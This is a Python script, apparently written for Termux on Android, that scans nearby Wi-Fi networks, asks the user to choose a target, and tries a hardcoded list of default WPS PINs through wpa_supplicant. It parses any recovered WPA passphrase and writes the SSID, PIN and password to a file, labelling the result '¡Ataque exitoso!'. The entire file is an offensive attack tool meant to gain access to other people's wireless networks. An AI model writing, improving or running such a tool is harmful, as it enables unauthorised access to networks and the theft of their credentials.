import os
import subprocess
import tempfile
import re
import time

def run_command(command):
    """Ejecuta un comando en el shell y retorna la salida."""
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate()
    return stdout.strip(), stderr.strip()

def scan_wifi(interface):
    """Escanea redes Wi-Fi disponibles usando la interfaz especificada."""
    print("[+] Escaneando redes Wi-Fi...")
    command = f"iwlist {interface} scan"
    stdout, stderr = run_command(command)
    
    if "No scan results" in stdout or not stdout:
        print("[-] No se encontraron redes Wi-Fi.")
        return []

    # Analiza la salida para obtener redes con SSID y BSSID
    networks = []
    blocks = stdout.split("Cell ")
    for block in blocks:
        ssid_match = re.search(r'ESSID:"(.*?)"', block)
        bssid_match = re.search(r"Address: ([\w:]+)", block)
        if ssid_match and bssid_match:
            networks.append({
                "SSID": ssid_match.group(1),
                "BSSID": bssid_match.group(1),
            })
    return networks

def generate_pins():
    """Genera una lista de PINs predeterminados o aleatorios."""
    # Aquí puedes agregar más lógica para generar PINs dinámicos
    return ["12345670", "00005678", "58442722", "12349876", "98765432"]

def create_wpa_supplicant_conf(ssid, pin):
    """Crea un archivo de configuración para wpa_supplicant."""
    conf_content = f"""
ctrl_interface=DIR=/data/misc/wifi/sockets
update_config=1

network={{
    ssid="{ssid}"
    key_mgmt=WPS
    pin="{pin}"
}}
"""
    conf_file = tempfile.NamedTemporaryFile(delete=False, mode='w')
    conf_file.write(conf_content)
    conf_file.close()
    return conf_file.name

def try_pin(interface, ssid, pin):
    """Intenta conectar al AP usando un PIN WPS."""
    print(f"[+] Intentando PIN '{pin}' en SSID: {ssid}...")
    conf_file = create_wpa_supplicant_conf(ssid, pin)
    wpa_supplicant_path = "/data/data/com.termux/files/usr/bin/wpa_supplicant"

    command = f"{wpa_supplicant_path} -i {interface} -c {conf_file} -dd"
    stdout, stderr = run_command(command)

    os.remove(conf_file)

    if "WPA PSK" in stdout or "WPA KEY" in stdout:
        password_match = re.search(r'WPA PSK: (.+)', stdout)
        if password_match:
            return password_match.group(1)
    return None

def main():
    os.system("clear")
    interface = "wlan1"  # Cambiar si es necesario
    networks = scan_wifi(interface)

    if not networks:
        print("[-] No se encontraron redes Wi-Fi disponibles.")
        return

    print("\n[+] Redes Wi-Fi disponibles:")
    for i, net in enumerate(networks):
        print(f"{i+1}. SSID: {net['SSID']}, BSSID: {net['BSSID']}")

    try:
        choice = int(input("\nSelecciona el número de la red objetivo: ")) - 1
        selected_network = networks[choice]
    except (ValueError, IndexError):
        print("[-] Selección inválida.")
        return

    pins = generate_pins()
    for pin in pins:
        password = try_pin(interface, selected_network['SSID'], pin)
        if password:
            print("\n[+] ¡Ataque exitoso!")
            print(f"[+] SSID: {selected_network['SSID']}")
            print(f"[+] PIN: {pin}")
            print(f"[+] Contraseña: {password}")
            with open("wifi_result.txt", "w") as result_file:
                result_file.write(f"SSID: {selected_network['SSID']}\nPIN: {pin}\nContraseña: {password}\n")
            print("[+] Información guardada en wifi_result.txt")
            break
        else:
            print(f"[-] PIN {pin} fallido.")
    else:
        print("[-] No se pudo acceder a la red con los PINs proporcionados.")

if __name__ == "__main__":
    main()
